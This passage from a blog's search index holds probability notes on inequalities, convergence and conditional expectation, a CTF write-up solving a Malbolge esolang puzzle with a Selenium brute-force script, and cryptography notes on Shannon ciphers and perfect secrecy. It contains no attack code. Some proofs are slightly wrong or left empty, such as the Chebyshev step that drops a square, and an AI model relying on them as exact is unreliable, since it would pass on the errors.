\\frac{\\mathbb{E}[|X|^p]}{a^p}. Proof: Since $f \\geq 0$ and is monotonically increasing, we have : f(|X|) \\geq f(|X|)\\mathbf{1}_{\\{|X| \\geq a\\}} \\geq f(a)\\mathbf{1}_{\\{|X| \\geq a\\}}.From the monotonicity of the expectation, it follows that: \\mathbb{E}[f(|X|)] \\geq \\mathbb{E}[f(a)\\mathbf{1}_{\\{|X| \\geq a\\}}] = f(a)P(|X| \\geq a).Since $f(a) &gt; 0$, the claim follows. $\\square$ Theorem (Chebyshev&#39;s inequality):Let $X \\in \\mathcal{L}^2$ (i.e.$\\mathbb{E}[|X|^2] &lt; \\infty$) be a real-valued random variable, then for all $a &gt; 0$ we have:P(|X-\\mathbb{E}[X]| \\geq a) \\leq \\frac{\\text{Var}(X)}{a^2}. Proof: Let $Y = X-\\mathbb{E}[X]$, $f(x):=x^2$. By applying Markov’s inequality we have: P(|X-\\mathbb{E}[X]| \\geq a) \\leq \\frac{ \\mathbb{E}[|X-\\mathbb{E}[X]]}{a^2}\\leq \\frac{\\text{Var}(X)}{a^2}.$\\square$ ConvergenceDefinition: For $p \\geq 1$ we say $Y \\in L^p$ if $E[|Y|^p] &lt; \\infty$. Definition: Let $X,X_i,i \\geq 1$ be random variables on the same probability space $(\\Omega,\\mathcal{F},P)$.1. $X_n \\rightarrow X$ almost surely (a.s.) ifP(\\{\\omega | \\lim_{n \\to \\infty} X_n(\\omega) = X(\\omega)\\}) = 1.We write $X_n \\xrightarrow{P-a.s.} X$.2. $X_n \\rightarrow X$ in probability if \\forall \\varepsilon > 0 : \\lim_{n \\to \\infty} P(|X_n - X| > \\varepsilon) = 0.We write $X_n \\xrightarrow{P} X$ or $X_n \\xrightarrow{\\text{in probability}} X$.3. $X_n \\to X$ in $L^p$ for $p \\geq 1$ if $X_n \\in L^p$ for all $n$, $X \\in L^p$, and\\lim_{n \\to \\infty} E[|X_n - X|^p] = 0.We write $X_n \\xrightarrow{L^p} X$. Definition: Let $\\mu_n, \\mu$ be probability measures on $(\\mathbb{R}, \\mathcal{B}(\\mathbb{R}))$, we say that $\\mu_n$ converges weakly to $\\mu$ ($\\mu_n \\Rightarrow \\mu$ or $\\mu_n \\xrightarrow{w} \\mu$) if\\int f \\, d\\mu_n \\longrightarrow \\int f \\, d\\mu \\quad \\forall f : \\mathbb{R} \\to \\mathbb{R} \\text{ bounded and continuous.} \\tag{3.4}We say $X_n \\xrightarrow{w} X$ if $\\mathcal{L}(X_n) \\xrightarrow{w} \\mathcal{L}(X)$, where $\\mathcal{L}(X_n)$ denotes the distribution of $X_n$. Remark: X_n \\xrightarrow{w} X \\quad \\Longleftrightarrow \\quad E[f(X_n)] \\underset{n \\to \\infty}{\\longrightarrow} E[f(X)] \\quad \\forall f : \\mathbb{R} \\to \\mathbb{R} \\text{ bounded and continuous.} Proof: $E[f(Y)] = \\int f(y) \\, \\mu(dy) \\quad \\text{with } \\mu = \\mathcal{L}(Y).$$\\square$ Theorem:(a) If $p_1 &lt; p_2$, then $X_n \\to X$ in $L^{p_2}$ implies $X_n \\to X$ in $L^{p_1}$.(b) $X_n \\to X$ in $L^p$ or almost surely implies $X_n \\to X$ in probability.(c) Suppose there exists $Y \\in L^p$ such that $|X_n| \\leq Y$ for all $n$. If $X_n \\to X$ in probability and $X \\in L^p$, then $X_n \\to X$ in $L^p$. proof: $\\square$ Corollary: If $X_n \\to X’$ in $L^p$ and $X_n \\to X’’$ almost surely, then $X’ = X’’$ a.e. (i.e. $P(X’ = X’’) = 1$). proof: It follows from the Theorem that $X_n \\to X$ and $X_n \\to X’’$ in probability, since the limit is unique, one has $X’ = X’’$ a.e.$\\square$ Conditional ExpectationDefinitionsDefinition: Let $(\\Omega, \\mathcal{F}_0, P)$ be a probability space. Let $X : \\Omega \\to [-\\infty, +\\infty]$ be an $(\\mathcal{F}_0, \\mathcal{B}([-\\infty,+\\infty]))$-measurable random variable with $\\mathbb{E}[|X|] &lt; \\infty$ or $X \\geq 0$, and let $\\mathcal{F} \\subseteq \\mathcal{F}_0$ be a $\\sigma$-algebra.The conditional expectation $\\mathbb{E}[X \\mid \\mathcal{F}]$ of $X$ given $\\mathcal{F}$ is a random variable $Y : \\Omega \\to [-\\infty, +\\infty]$ with the following properties:(C1) $Y$ is $(\\mathcal{F}, \\mathcal{B}([-\\infty,+\\infty]))$-measurable.(C2)\\int_A X \\, dP = \\int_A Y \\, dP \\quad \\forall A \\in \\mathcal{F}If $\\mathbb{E}[|X|] &lt; \\infty$, then $\\mathbb{E}[X \\mid \\mathcal{F}]$ is almost surely finite. Every random variable fulfilling (C1) and (C2) is called a version of $\\mathbb{E}[X \\mid \\mathcal{F}]$. Definition:\\mathbb{E}[X \\mid Y]:= \\mathbb{E}[X \\mid \\sigma(Y)] Theorem:The conditional expectation exists and is almost surely unique. ProportiesTheorem:1. $X$ $\\mathcal{F}$-measurable $\\Longrightarrow$ $\\mathbb{E}[X\\mid \\mathcal{F}] = X$ almost surely.2. $\\sigma(X)$ and $\\mathcal{F}$ are independent $\\Longrightarrow$ $\\mathbb{E}[X \\mid \\mathcal{F}] = \\mathbb{E}[X]$ almost surely. Theorem:1. Linearity: For $a \\in \\mathbb{R}$,\\mathbb{E}[aX + Y \\mid \\mathcal{F}] = a \\mathbb{E}[X \\mid \\mathcal{F}] + \\mathbb{E}[Y \\mid \\mathcal{F}] \\quad \\text{almost surely.}2. Monotonicity: $X \\leq Y \\quad \\Longrightarrow \\quad \\mathbb{E}[X \\mid \\mathcal{F}] \\leq \\mathbb{E}[Y \\mid \\mathcal{F}]$ almost surely.3. Monotone convergence: $X_n \\geq 0$, $X_n \\uparrow X \\quad \\Longrightarrow \\quad \\mathbb{E}[X_n \\mid \\mathcal{F}] \\uparrow \\mathbb{E}[X \\mid \\mathcal{F}]$ almost surely. Theorem: \\mathbb{E}[\\mathbb{E}[X \\mid \\mathcal{F}] = \\mathbb{E}[X] Theorem:If $X$ is $\\mathcal{F}$-measurable, $\\mathbb{E}[|XY|] &lt; \\infty$ and $\\mathbb{E}[|Y|] &lt; \\infty$, then\\mathbb{E}[XY \\mid \\mathcal{F}] = X \\mathbb{E}[Y \\mid \\mathcal{F}] \\quad \\text{almost surely}.This holds also if $X \\geq 0$ and $Y \\geq 0$. Theorem (“The smaller $\\sigma$-algebra wins”) : Let $\\mathcal{F}_1, \\mathcal{F}_2$ be $\\sigma$-algebras satisfying $\\mathcal{F}_1 \\subseteq \\mathcal{F}_2$,$X$ be random variable. Then \\mathbb{E}[\\mathbb{E}[X \\mid \\mathcal{F}_1] \\mid \\mathcal{F}_2] = \\mathbb{E}[\\mathbb{E}[X \\mid \\mathcal{F}_2] \\mid \\mathcal{F}_1]= \\mathbb{E}[X \\mid \\mathcal{F}_1]almost surely.","categories":[{"name":"TUM 数学 笔记","slug":"TUM-数学-笔记","permalink":"https://archer-baiyi.github.io/en/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/"},{"name":"概率/统计 Probability & Statistics","slug":"TUM-数学-笔记/概率-统计-Probability-Statistics","permalink":"https://archer-baiyi.github.io/en/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87-%E7%BB%9F%E8%AE%A1-Probability-Statistics/"}],"tags":[{"name":"概率论","slug":"概率论","permalink":"https://archer-baiyi.github.io/en/tags/%E6%A6%82%E7%8E%87%E8%AE%BA/"},{"name":"Probability Theory","slug":"Probability-Theory","permalink":"https://archer-baiyi.github.io/en/tags/Probability-Theory/"}]},{"title":"奇奇怪怪的编程语言：Malbolge","slug":"CTF/Misc/奇奇怪怪的编程语言：Malbolge","date":"2025-04-25T20:30:56.000Z","updated":"2026-01-24T10:05:50.199Z","comments":true,"path":"2025/04/25/CTF/Misc/奇奇怪怪的编程语言：Malbolge/","permalink":"https://archer-baiyi.github.io/en/2025/04/25/CTF/Misc/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%EF%BC%9AMalbolge/","excerpt":"简单介绍 Malbolge","text":"除了我们日常使用的Python、Java、C等主流编程语言外，还存在这么一类极为晦涩难懂的编程语言，被称为深奥的编程语言（Esoteric programming language，简称Esolang）。它们被设计用于测试计算机语言表达的极限，所以不会考虑它们的实用性。今天我们来看其中一个非常典型的例子：Malbolge。 Malbolge由Ben Olmstead 在1998年发明,其名字来自于但丁的《神曲》中的第八层地狱“Malebolge”，意大利语中意为“邪恶的沟渠”（male bolge）。 Hello World下面这段Malbolge代码会输出“Hello, World.”1(=&lt;`#9]~6ZY327Uv4-QsqpMn&amp;+Ij&quot;&#x27;E%e&#123;Ab~w=_:]Kw%o44Uqp0/Q?xNvL:`H%c#DD2^WV&gt;gY;dts76qKJImZkj而这段代码则会输出“Hello, World!”1(&#x27;&amp;%:9]!~&#125;|z2Vxwv-,POqponl$Hjihf|B@@&gt;,=&lt;M:9&amp;7Y#VV2TSn.Oe*c;(I&amp;%$#&quot;mCBA?zxxv*Pb8`qo42mZF.&#123;Iy*@dD&#x27;&lt;;_?!\\&#125;&#125;|z2VxSSQ我们可以看到，光是一个标点符号的改变，就导致代码发生了天翻地覆的变化。 CTF大多数涉及 Malbolge 的基础 CTF 题目会提供一段看似乱码的内容。此时，需要识别出这实际上是 Malbolge 代码，并通过编译器将其编译出来。 比如说这段代码会输出“flag{this_is_a_flag}”1D&#x27;`;qLo=I;|XyhCwStcr=NL-,I$)&quot;XW21A/c&gt;,v_)\\xqYonsrqj0hPlkdcb(`Hd]#a`_A@VzZY;QuUTSRQJImGLEJIBAeED&amp;B;_9&gt;7&lt;;:921U54ts10)M&#x27;&amp;Jkj&quot;F&amp;%|#z@~&#125;vu;y[Zvo5Vlkjongf,Miha&#x27;Hd]\\[ZY&#125;W?UZYRQuU7SLp] 有些题目可能需要对编译后的结果再进行一次处理，比如使用 base64 解码等。但是这些内容都不需要了解任何 Malbolge 语言的特性，只需要找到一个编译器即可。因此，接下来我会介绍一些 Malbolge 的特点，并分享一道较难的 CTF 比赛真题。 Malbolge的特点首先，Malbolge会使用 三个寄存器（register），分别是 a、c 和 d。a：Accumulator，主要用于存储计算结果和输入/输出数据。c：Code Pointer / Instruction Pointer，用于指向当前正在执行的代码的位置（即指令指针）。d：Data Pointer，用于指向内存中的数据位置。 其次，基于这些寄存器，Malbolge提供了八条指令，分别为：jmp，out，in，rotr，mov，crz，nop，end。我们可以利用某些在线编译网站提供的规范化（Normalization）功能，将代码转换为由一组固定字符组成的指令字符集，从而更方便地进行调试（debug）。 更多详细信息可以参考https://en.wikipedia.org/wiki/Malbolge 例题题目来源：Platypwn 2024 CTF链接：https://platypwn.ctf.platypwnies.de/题面： 下载下来的文件内容为：1D&#x27;`__LK!mY:jiy6Be3cPa)onKI[#j4&amp;DUBzcx&gt;_;):&#x27;Zputml21onPlkd*hJIedcb[!YXW&#123;[TYXWVUNrRQPImGFEDIBfFED=&lt;;:?8\\&lt;;432V65ut,P*/(&#x27;&amp;J*j(!~&#125;C#cy~&#125;v&lt;tsxwvon4Ukji/Plejc)gIedcb[!_^]\\U=SwWVONMqQPONMFjJIHGF(&gt;b&lt;$:?876ZG这段内容看似是乱码，但根据题面的提示“the worst of esoteric programming languages” （正如前文所提到的），我们可以判断出它实际上是一段Malbolge的代码。直接编译这段代码无法得到任何结果，因此我们可以选择使用某个在线编译工具对其进行规范化处理，使代码转换为更标准的指令字符集，从而便于调试（debug）： normalized 之后的结果为： 1ojii&lt;vvj/io//jov/o/&lt;/p**&lt;i/pjvo&lt;/&lt;pjp&lt;*iv&lt;v*poopp&lt;&lt;oo*oop&lt;o**oooop&lt;ppp&lt;opooooop&lt;ooop&lt;ppppop&lt;oooppppop&lt;ooppp&lt;oo**p&lt;poppp&lt;o*oppp&lt;o*poop&lt;ppooopp&lt;*ppp&lt;*opop&lt;o*oooop&lt;oooop*p&lt;ooppp&lt;ooooop&lt;ooooo*p&lt;p*poppp&lt;v 当我们运行这段代码时，会发现它在执行到中间某处时意外停止了： 大概是在这个位置： 所以我们猜测（尝试）需要将这一项改成其他的命令。而在将其改正为p了之后会得到： 订正后的内容 1ojii&lt;vvj/io//jov/o/&lt;/p**&lt;i/pjvo&lt;/&lt;pjp&lt;*iv&lt;p*poopp&lt;&lt;oo*oop&lt;o**oooop&lt;ppp&lt;opooooop&lt;ooop&lt;ppppop&lt;oooppppop&lt;ooppp&lt;oo**p&lt;poppp&lt;o*oppp&lt;o*poop&lt;ppooopp&lt;*ppp&lt;*opop&lt;o*oooop&lt;oooop*p&lt;ooppp&lt;ooooop&lt;ooooo*p&lt;p*poppp&lt;v 1D&#x27;`__LK!mY:jiy6Be3cPa)onKI[#j4&amp;DUBzcx&gt;_;):&#x27;Zputml21onPlkd*hJIedcb[!YXW&#123;[TYXWVUNrRQPImGFEDIBfFED=&lt;;:?8\\&lt;;432V65ut,P*/(&#x27;&amp;J*j(!~&#125;C#cy~&#125;v&lt;tsxwvon4Ukji/Plejc)gIedcb[!_^]\\U=SwWVONMqQPONMFjJIHGF(&gt;b&lt;$:?876ZG 具体改动： 这样一来我们就成功获取到了flag。 其他办法暴力破解当然，如果我们知道（或猜测）这段代码中只有一个地方存在问题，可以尝试使用暴力破解（brute force）的方法进行修正。这种方法的核心是将每条指令逐一修改为其他可能的指令，并观察编译结果。由于不需要理解 Malbolge 的具体特性，因此这种方法非常简单。 为实现这一目标，我们可以利用支持在线编译 Malbolge 的网站，以及 Python 中的 Selenium 库。Selenium 提供了浏览器自动化操作功能，能够帮助我们完成网页上的勾选、输入操作，并提取输出内容，从而实现自动化调试。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980from selenium import webdriverfrom selenium.webdriver.common.by import Byfrom selenium.webdriver.support.ui import WebDriverWaitfrom selenium.webdriver.support import expected_conditions as ECimport time# 初始化浏览器（确保你有对应的浏览器驱动）# driver = webdriver.Chrome() # Chromedriver = webdriver.Firefox() # Firefoxtry: # 打开目标网页 driver.get(&quot;https://lutter.cc/malbolge/debugger.html&quot;) # 等待页面加载 wait = WebDriverWait(driver, 30) # 勾选所有复选框 checkboxes_ids = [&#x27;until_in&#x27;, &#x27;until_out&#x27;, &#x27;until_crz&#x27;, &#x27;until_rotr&#x27;, &#x27;until_jmp&#x27;, &#x27;until_mov&#x27;, &#x27;until_nop&#x27;] for checkbox_id in checkboxes_ids: checkbox = wait.until(EC.element_to_be_clickable((By.ID, checkbox_id))) if not checkbox.is_selected(): checkbox.click() # 勾选Normalized normalized_checkbox = wait.until(EC.element_to_be_clickable((By.ID, &#x27;normalizedcode&#x27;))) if not normalized_checkbox.is_selected(): normalized_checkbox.click() # 原始Malbolge代码 original_code = &quot;ojii&lt;vvj/io//jov/o/&lt;/p**&lt;i/pjvo&lt;/&lt;pjp&lt;*iv&lt;v*poopp&lt;&lt;oo*oop&lt;o**oooop&lt;ppp&lt;opooooop&lt;ooop&lt;ppppop&lt;oooppppop&lt;ooppp&lt;oo**p&lt;poppp&lt;o*oppp&lt;o*poop&lt;ppooopp&lt;*ppp&lt;*opop&lt;o*oooop&lt;oooop*p&lt;ooppp&lt;ooooop&lt;ooooo*p&lt;p*poppp&lt;v&quot; # 替换的字符列表 replace_chars = [&#x27;i&#x27;, &#x27;j&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;/&#x27;, &#x27;*&#x27;] # 标志变量，用于退出循环 found_flag = False # 循环替换并执行代码 for i in range(1, len(original_code)): if found_flag: # 如果找到结果，退出外层循环 break for char in replace_chars: modified_code = list(original_code) modified_code[i] = char # 替换第i个字符 modified_code = &#x27;&#x27;.join(modified_code) # 输入修改后的Malbolge代码 program_textarea = driver.find_element(By.ID, &quot;program&quot;) program_textarea.clear() program_textarea.send_keys(modified_code) # 点击Load/Reset按钮 load_button = driver.find_element(By.ID, &quot;load&quot;) load_button.click() # 点击Execute按钮 execute_button = wait.until(EC.element_to_be_clickable((By.ID, &quot;run&quot;))) execute_button.click() # 等待执行完成并获取Output内容 time.sleep(1) # 根据需要调整等待时间 output_div = driver.find_element(By.ID, &quot;output&quot;) output_content = output_div.text # 仅当output内容包含&quot;flag&quot;时打印结果 if &quot;pp&#123;&quot; in output_content.lower(): print(f&quot;将第 &#123;i + 1&#125; 位修改成 &#x27;&#123;char&#125;&#x27; 后成功编译出flag。&quot;) print(f&quot;编译成功的代码: &#123;modified_code&#125;&quot;) found_flag = True # 设置标志变量，标记已找到结果 break # 退出内层循环finally: # 关闭浏览器 driver.quit()# 运行成功后会得到：&quot;&quot;&quot;将第 43 位修改成 &#x27;p&#x27; 后成功编译出flag。编译成功的代码: ojii&lt;vvj/io//jov/o/&lt;/p**&lt;i/pjvo&lt;/&lt;pjp&lt;*iv&lt;p*poopp&lt;&lt;oo*oop&lt;o**oooop&lt;ppp&lt;opooooop&lt;ooop&lt;ppppop&lt;oooppppop&lt;ooppp&lt;oo**p&lt;poppp&lt;o*oppp&lt;o*poop&lt;ppooopp&lt;*ppp&lt;*opop&lt;o*oooop&lt;oooop*p&lt;ooppp&lt;ooooop&lt;ooooo*p&lt;p*poppp&lt;v&quot;&quot;&quot; 修改解释器源代码有一位参赛选手分享了一个非常巧妙的解法，具体如下：首先他找到了一个用 C 语言编写的原始 Malbolge 解释器（https://github.com/bipinu/malbolge）。接着，他将第 131 行的return 改为 break，以避免 exec() 函数提前结束。最后，他使用修改后的解释器运行题目中提供的 Malbolge 代码，成功得到了 flag。 工具（网站）最后附上一些网页，可以用来生成，编译，或者debug。 https://lutter.cc/malbolge/debugger.html https://zb3.me/malbolge-tools/#generator https://tio.run/##y03MScrPSU/9/19DXU3VyjJWsa62psoorKK8TFcnwL@wID8vR8UjKzMjrcbJwcFOx9bG18pSzTxSOSzMKCQ4T88/VSvZWsNTTVVFWSnX2cnRvqqiokwrIMkioTDfxCg3yk2v2rNSyyHFRd3GOt5eMaYWYnpwcOD//wA","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Misc","slug":"CTF/Misc","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Misc/"}],"tags":[{"name":"Misc","slug":"Misc","permalink":"https://archer-baiyi.github.io/en/tags/Misc/"},{"name":"esolang","slug":"esolang","permalink":"https://archer-baiyi.github.io/en/tags/esolang/"},{"name":"Malbolge","slug":"Malbolge","permalink":"https://archer-baiyi.github.io/en/tags/Malbolge/"}]},{"title":"密码学 Kryptografie","slug":"TUM info 笔记/密码学/密码学基础","date":"2025-04-24T19:45:04.000Z","updated":"2025-05-04T15:00:06.518Z","comments":true,"path":"2025/04/24/TUM info 笔记/密码学/密码学基础/","permalink":"https://archer-baiyi.github.io/en/2025/04/24/TUM%20info%20%E7%AC%94%E8%AE%B0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/","excerpt":"密码学相关笔记","text":"Basics我们首先来看一下Shannon是如何定义加密的： Schannon cipher 是一个加密方案（encryption scheme）$\\Pi := (E,D)$ ，作用于$(\\mathcal{K},\\mathcal{M},\\mathcal{C})$上，其中： $\\mathcal{K}$ 是一个有限的加密密钥集合。 $\\mathcal{M}$ 是一个有限的消息集合。 $\\mathcal{C}$ 是一个有限的密文集合。 $E: \\mathcal{K} \\times \\mathcal{M} \\to \\mathcal{C}$ 是加密函数。 $D: \\mathcal{K} \\times \\mathcal{C} \\to \\mathcal{M}$ 是解密函数。 并且满足Correctness property：$\\forall k \\in \\mathcal{K},\\ m \\in \\mathcal{M} :\\ D(k, E(k, m)) = m$。 我们来看一个很简单的例子：One-time-pad (OTP)。 $\\mathcal{K} = \\mathcal{M} = \\mathcal{C} := \\{0,1\\}^L$ with $L$ as a fixed length $\\geq 1$. $E(k, m) := k \\oplus m$ $D(k, c) := k \\oplus c$ （这里的$\\oplus$表示的是xor运算。） 注意到： D(k, E(k, m)) = D(k, k \\oplus m) = k \\oplus (k \\oplus m) = (k \\oplus k) \\oplus m = 0^L \\oplus m = m所以OPT是一个Schannon cipher。 Definition 1: (Perfect Ciphertext Indistinguishability / perfect secrecy / perfect security)一个定义在 $(\\mathcal{K}, \\mathcal{M}, \\mathcal{C})$ 上的 Shannon cipher $\\Pi = (E, D)$，满足密文完全不可区分（has perfectly indistinguishable ciphertexts）（或者说是绝对安全 perfectly secure的），当\\forall m_0, m_1 \\in \\mathcal{M},\\ c \\in \\mathcal{C} :\\ \\Pr[E(k, m_0) = c] = \\Pr[E(k, m_1) = c].其中概率是针对密钥的分布而言，$k$ 是一个随机变量。 我们会假设每个密钥 $k$ 都是从 $\\mathcal{K}$ 里uniformly挑选的，即每个密钥被挑选的概率都等于 $\\frac{1}{\\mathcal{K}}$。 设 N_{m, c} = \\left| \\left\\{ k \\in \\mathcal{K} : E(k, m) = c \\right\\} \\right|为可以将m加密成c的密钥数量，那么我们可以将定义里的等式重新重新表述为： \\forall m_0, m_1 \\in \\mathcal{M},\\ c \\in \\mathcal{C} :\\ N_{m_0, c} = N_{m_1, c}也就是说对于任意2个明文和1个密文，都存在同样多的密钥可以将这两段密文都加密成这段密文。 Theorem 1:The one-time pad (OTP) is perfectly secure. 证明： Given an OTP, for all $m \\in \\mathcal{M}$ there is exactly one unique $k \\in \\mathcal{K}$ such that $E(k, m) = c$. It follows that $N_{m,c} = 1$，因为 存在：There is at least one key $k := c \\oplus m$ with $E(c \\oplus m, m) = c \\oplus m \\oplus m = c$. 唯一：Assuming two keys $k_0, k_1 \\in \\mathcal{K}$ exist where $E(k_0, m) = E(k_1, m) = c$: \\begin{aligned} E(k_0, m) &= E(k_1, m) \\\\ k_0 \\oplus m &= k_1 \\oplus m \\\\ k_0 \\oplus m \\oplus m &= k_1 \\oplus m \\oplus m \\\\ k_0 &= k_1 \\end{aligned}所以有： \\forall m_0, m_1 \\in \\mathcal{M}, c \\in \\mathcal{C} : N_{m_0, c} = N_{m_1, c}=1. $\\square$ Theorem 2: 如果$\\Pi = (E, D)$是绝对安全的（perfectly secure），那么有 $|\\mathcal{K}| \\geq |\\mathcal{M}|$。 证明： 我们假设 $|\\mathcal{K}| &lt; |\\mathcal{M}|$，并任意选择一段明文$m_0$和一个密钥$k’$。设$c := E(k’,m_0)$，那么有 Pr[E(k,m_0)=c] > 0设 S = \\{ D(\\hat{k},c) \\in \\mathcal{M}: \\hat{k} \\in \\mathcal{K} \\}为c所有可能的解密结果。选择$m_1\\in \\mathcal{M}\\backslash S$ （这个集合非空是因为 $|S| \\leq |\\mathcal{K}| &lt; |\\mathcal{M}|$），那么就有 0 < \\Pr[E(k, m_0) = c] \\ne \\Pr[E(k, m_1) = c] = 0a contradiction. $\\square$ 该如何理解这个定理呢？ 其主要说明的就是当密钥空间小于信息空间时，可能会对于有些密文只存在一个（可能的）对应的明文。 然而在实际情况里，一直要求密钥空间大于信息空间其实不太现实，因为我们需要各方各面都传输大量的信息。这就导致Shannon提出来的这个perfect secrecy概念不够实用（practical）。 其根本的原因是，shannon提出来的概念着重于杜绝所有潜在的威胁。但实际上对我们来说，有些威胁是可以接受的：比如说质因数分解很大的数需要大量的计算资源与时间，对我们很难造成什么实质性的威胁。又或者是我运气够好，可以一下子猜到密码。 所以说我们实际追求的是无法以不可忽略的（non-negligible）概率被高效（efficiently）破解的高效加密算法，。 What we would like to have are efficient encryption schemes that cannot be broken “efficiently” with a “non-negligible” probability. 比如说质因数分解，它的理论成功概率很高，但是效率非常低，所以可以被忽视。而猜密码这种方法的成功概率太低了，所以也不需要理会。 重新表述一下就是：“不存在一个算法可以在时间T内以p的概率成功破解我们的加密算法”。 Definition 2 (Polynomially-bounded):A function $f : \\mathbb{Z}_+ \\to \\mathbb{R}$ is called polynomially-bounded if there exist $c, n_0 \\in \\mathbb{N}$ such that for all integers $n \\geq n_0$, we have |f(n)| \\leq n^c \\quad (f(n) \\in \\mathcal{O}(n^c)). Definition 3 (PPT algorithm):An algorithm is called efficient, if its runtime as a function of its input length is polynomially-bounded. We call this algorithm a probabilistic polynomial time (PPT) algorithm. 就其实efficient和PPT是一个意思。 Definition 4 (Efficiently sampleable):A set $S$ is efficiently sampleable if there is a PPT-algorithm that is able to sample an element from it uniformly and randomly.For such a sampling, we use the notation $s \\xleftarrow{R} S$. Definition 5 (Negligible):A function f: \\mathbb{Z}_+ \\to \\mathbb{R}is called negligible if \\forall c \\in \\mathbb{N} \\ \\exists n_0 \\in \\mathbb{Z}_+ \\ \\text{ s.t. for all integers } n \\geq n_0 :|f(n)| \\leq \\frac{1}{n^c} \\quad \\left(f(n) \\in \\mathcal{O}\\left(\\frac{1}{n^c}\\right)\\right). $f$的值会无限小。 例子：$\\frac{1}{2^n},\\quad \\frac{1}{n^{\\log n}}$，the probability of randomly choosing a specific key from a set of $2^n$ $n$-bit keys Definition 6 (Super-poly):A function $f : \\mathbb{Z}_+ \\to \\mathbb{R}$ is called super-poly if $\\frac{1}{f}$ is negligible. 翻译一下： 对于所有的 $c \\in \\mathbb{N}$ 都存在一个 $n_0 \\in \\mathbb{Z}_+$使得 for all integers $n \\geq n_0$, we have ： \\begin{align*} |\\frac{1}{f(n)}| &\\leq \\frac{1}{n^c} \\\\ \\Leftrightarrow f(n) &\\geq n^c \\end{align*}例子：The runtime of an algorithm enumerating all $n$-bit keys to possible ciphertexts for a message $m$ by calculating $E(k, m)$ for all $2^n$ keys is super-poly. Let $c \\in \\mathbb{R}_+$ be a constant, f_{neg}, g_{neg}be negligible functions, f_{poly}, g_{poly}be polynomially-bounded functions, and f_{spoly}, g_{spoly}be super-polynomial functions. Then: 通常我们会定义2个参数： Security parameter $\\lambda$: A positive integer. System parameter $\\Lambda$: A bit string. $\\lambda$ is chosen when a cipher is deployed. 一般来说，$\\lambda$ 的值越大，密码系统的安全等级越高。较高的值通常与较长的密钥相关联，同时对加解密操作 $D$ 和 $E$ 的性能带来负面影响。 而$\\Lambda$ is not chosen but determined by $\\lambda$ for a specific cipher. 比如说，$\\lambda$可能表示模数 $n$ 的位长度（length in bits），$n$本身则为成为System parameter$\\Lambda$。 这两个参数都是公开的。 The parameterization applies the key, message and ciphertext spaces \\{\\mathcal{K}_{\\lambda, \\Lambda}\\}_{\\lambda, \\Lambda},\\quad \\{\\mathcal{M}_{\\lambda, \\Lambda}\\}_{\\lambda, \\Lambda},\\quad \\{\\mathcal{C}_{\\lambda, \\Lambda}\\}_{\\lambda, \\Lambda} Definition 7 (efficient algorithm):Let $A$ be an algorithm that takes as input a security parameter $\\lambda \\in \\mathbb{Z}_{\\geq 1}$, as well as other parameters encoded as a bit string $x \\in \\{0,1\\}^{\\leq p(\\lambda)}$ for some fixed polynomial $p$.We call $A$ an efficient algorithm if there exist a poly-bounded function $t$ and a negligible function $\\epsilon$such that for all $\\lambda$ and $x$, the probability that the running time of $A$ on input $(\\lambda, x)$ exceeds $t(\\lambda)$ is at most $\\epsilon(\\lambda)$. 翻译一下：A的输入为一个 security parameter $\\lambda \\in \\mathbb{Z}_{\\geq 1}$, 以及被 encoded as a bit string $x \\in \\{0,1\\}^{\\leq p(\\lambda)}$ （for some fixed polynomial $p$）的其他的parameters。 Definition 8 (computational cipher):A computational cipher is a pair of efficient algorithms $\\Pi := (E,D)$ such that:$k \\in \\mathcal{K}$ is an encryption key.$m \\in \\mathcal{M}$ is a message.$c \\in \\mathcal{C}$ is a ciphertext.$E : \\mathcal{K} \\times \\mathcal{M} \\rightarrow \\mathcal{C}$ is the encryption algorithm.$D : \\mathcal{K} \\times \\mathcal{C} \\rightarrow \\mathcal{M}$ is the decryption algorithm.$\\mathcal{K}, \\mathcal{M}$ and $\\mathcal{C}$ are finite spaces. computational cipher的定义其实和Shannon cipher就只差了一个 efficient algorithms 的条件。 当然在现实生活中，传输数据时会产生各种随机的噪音，所以$E$ 可以是 non-deterministic。在这种情况下我们会引入一个新的参数randomness：$r \\in \\mathcal{R}$ ，并且用 c \\xleftarrow{R} E(k, m) \\quad\\text{ or }\\quad r \\xleftarrow{R} \\mathcal{R} \\quad\\text{ or }\\quad c \\leftarrow E(k, m; r)表示（受随机数的影响的）加密后的结果。 （这里箭头上的$R$就只是表面当前考虑的是受随机数的影响的加密） 而correctness requirement也需要随之改写成： \\forall c \\xleftarrow{R} E(k, m) : D(k, c) = m（即就算受随机数的影响，也需要可以成功解密出来。感觉跟coding theory很像。） 当$E$ 是 deterministic 的时候，我们会把$\\Pi = (E,D)$ 叫作 deterministic cipher。（比如说OTP） 一个deterministic cipher显然是Shannon cipher。 之前我们定义的 Perfect Ciphertext Indistinguishability 是这样的： \\forall m_0, m_1 \\in \\mathcal{M},\\ c \\in \\mathcal{C} :\\ \\Pr[E(k, m_0) = c] = \\Pr[E(k, m_1) = c].而我们希望将这个定义推广到可以适应所有的 predicate $\\phi$（一个判断函数，输出结果只为true或者false。也就是一个从$\\mathcal{C}$ 映射到$\\{0,1\\}$的函数。比如说判断“密文的前4位是否全为0”。）： \\forall \\phi \\in \\{0,1\\}^{\\mathcal{C}},\\ m_0, m_1 \\in \\mathcal{M}:\\ \\Pr[\\phi(E(k, m_0))] = \\Pr[\\phi(E(k, m_1))]给这个式子引入一个误差（a negligible chance for an adversary to break our scheme by demanding）就会变成： \\forall \\phi \\in \\{0,1\\}^{\\mathcal{C}},\\ m_0, m_1 \\in \\mathcal{M}:\\ |\\Pr[\\phi(E(k, m_0))] - \\Pr[\\phi(E(k, m_1))]| \\leq \\epsilon这个便是Statistical Ciphertext Indistinguishability的定义。 而所谓的Computational Ciphertext Indistinguishability便是在此基础上继续要求 predicate $\\phi$ 是efficient。 Attack Game我们通常会用一个Attack 